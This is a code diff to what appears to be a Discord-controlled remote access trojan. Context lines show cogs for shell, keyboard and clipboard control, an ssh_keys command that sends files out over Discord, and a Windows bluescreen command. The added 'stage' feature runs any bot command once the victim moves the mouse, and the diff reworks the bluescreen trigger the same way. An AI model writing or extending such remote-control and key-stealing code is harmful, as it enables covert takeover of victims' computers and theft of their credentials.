@@ -41,7 +41,7 @@ class MyBot(commands.Bot):
         # self is the bot here
         print(f"Logged in as: {self.user}")
 
-        default_cog_classes = [clipboard_cog, keyboard_cog, shell_cog, message_cog]
+        default_cog_classes = [clipboard_cog, keyboard_cog, shell_cog, message_cog, stage_cog]
                 
         if isWindows:
             windows_cog_classes = [bluescreen_cog,]
@@ -149,6 +149,17 @@ async def confirm_action(ctx, action_description):
 
     else:
         return True
+    
+
+async def wait_for_mouse(old_x, old_y):
+    while True:
+        x, y = pyautogui.position()
+        if abs(x - old_x) > 5 or abs(y - old_y) > 5:
+            print("movement detected")
+            break
+        else:
+            pass
+    return
     
 @bot.event
 async def on_command_error(ctx, error):
@@ -453,6 +464,49 @@ async def ssh_keys(ctx):
 
     await ctx.send(files=files_to_send)
 
+ 
+# Stage functions
+
+class stage_cog(commands.Cog):
+    def __init__(self, bot):
+        self.bot = bot
+        self.staged_actions = {}
+
+    @tasks.loop(seconds=1)
+    async def mouse_stage(self, ctx, old_x, old_y, command, *args):
+        x, y = pyautogui.position()
+        if abs(x - old_x) > 5 or abs(y - old_y) > 5:
+            print("movement detected")
+            await ctx.invoke(command, *args)
+            self.mouse_stage.stop()
+        else:
+            pass
+
+    @commands.group(name="stage", invoke_without_command=True)
+    async def stage(self, ctx):
+        await ctx.send("see help menu")
+
+
+
+    @stage.command(name="mouse")
+    async def mouse_command(self, ctx, command_name, *args):
+        command = self.bot.get_command(command_name)
+
+        if self.mouse_stage.is_running():
+            embed = embed_data(
+                title="Mouse stage",
+                description="A staged mouse event is already running, use `!stage status` to see active staged events",
+                color=discord.color.red()
+            )
+        else:
+            embed = embed_data(
+                title="Mouse stage",
+                description=f"The command `{command_name}` has been staged with mouse movement"
+            )
+            old_x, old_y = pyautogui.position()
+
+            self.mouse_stage.start(ctx, old_x, old_y, command, *args)
+        await ctx.send(embed=embed)
 
 # Clipboard functions
     
@@ -945,19 +999,6 @@ if isWindows:
 
             return embed
             
-        @tasks.loop(seconds=1)
-        async def bluescreen_mouse(self, ctx, old_x, old_y):
-            x, y = pyautogui.position()
-            print(old_x, old_y)
-            print(x, y)
-            if x != old_x and y != old_y:
-                print("BLUESCREEN")
-                self.bluescreen_mouse.stop()
-                embed = self.bluescreen()
-                await ctx.send(embed=embed)
-            else:
-                pass
-            
         
         @commands.command(name="bluescreen")
         async def run_bluescreen(self, ctx, arg=None):
@@ -966,7 +1007,8 @@ if isWindows:
             if confirm:
                 if arg == "mouse":
                     old_x, old_y = pyautogui.position()
-                    self.bluescreen_mouse.start(ctx, old_x, old_y)
+                    await wait_for_mouse(old_x, old_y)
+                    embed = self.bluescreen()
                 else:
                     embed = self.bluescreen()
 
